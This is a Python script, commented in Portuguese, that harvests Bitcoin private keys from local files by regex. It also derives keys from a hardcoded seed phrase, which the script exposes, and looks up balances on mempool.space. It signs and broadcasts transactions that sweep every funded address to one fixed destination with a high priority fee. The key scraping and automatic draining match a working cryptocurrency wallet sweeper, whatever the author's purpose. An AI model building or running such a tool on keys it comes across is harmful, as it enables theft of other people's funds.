import requests
import re
import time
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

def extract_potential_keys(filename):
    keys_found = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        wif_pattern = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
        keys_found.extend(wif_pattern)
        hex_pattern = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
        for h in hex_pattern:
            try:
                k = Key(h, network='bitcoin')
                keys_found.append(k.wif())
            except: continue
    except: pass
    return keys_found

def broadcast_transaction(hex_tx):
    # Tenta transmitir por 3 APIs diferentes para garantir o sucesso
    urls = [
        {"url": "https://blockstream.info/api/tx", "method": "POST", "data": hex_tx},
        {"url": "https://mempool.space/api/tx", "method": "POST", "data": hex_tx},
        {"url": "https://www.viabtc.com/res/tools/v1/broadcast", "method": "POST", "data": {"raw_tx": hex_tx}}
    ]
    for provider in urls:
        try:
            if isinstance(provider["data"], dict):
                r = requests.post(provider["url"], data=provider["data"], timeout=10)
            else:
                r = requests.post(provider["url"], data=provider["data"], timeout=10)
            print(f"Resposta Broadcast ({provider['url']}): {r.status_code} - {r.text}")
        except: continue

def scan_final_ultra():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys = []
    files = ['privatekeys.txt', 'priv.key.rtf', 'chaves_extraidas_e_enderecos_1.txt', 'FDR_Master_Wallet_Complete_20251006_143555_2.csv']
    
    for f in files:
        all_keys.extend(extract_potential_keys(f))

    # Tenta mnemônica com correção silenciosa
    try:
        phrase = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        master = HDKey.from_passphrase(phrase, network='bitcoin')
        for i in range(100):
            for path in [f"m/44'/0'/0'/0/{i}", f"m/49'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
                all_keys.append(master.subkey_for_path(path).wif())
    except: pass

    all_keys = list(set(all_keys))
    print(f"Iniciando varredura final de {len(all_keys)} chaves únicas em 3 formatos...")

    for wif in all_keys:
        try:
            k = Key(wif, network='bitcoin')
            for t_type in ['p2wpkh', 'p2sh-p2wpkh', 'p2pkh']:
                addr = k.address(witness_type=t_type)
                # Consulta rápida
                r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
                if r.status_code == 200 and r.json():
                    utxos = r.json()
                    print(f"!!! SALDO DETECTADO EM {addr} !!!")
                    utxo = max(utxos, key=lambda x: x['value'])
                    amount = utxo['value'] - 60000 # Taxa de prioridade extrema
                    
                    tx = Transaction(network='bitcoin')
                    tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                    tx.add_output(value=amount, address=dest_address)
                    tx.sign([wif])
                    
                    hex_gen = tx.raw_hex()
                    print(f"HEX_GEN:{hex_gen}")
                    broadcast_transaction(hex_gen)
            time.sleep(0.01)
        except: continue

if __name__ == "__main__":
    scan_final_ultra()
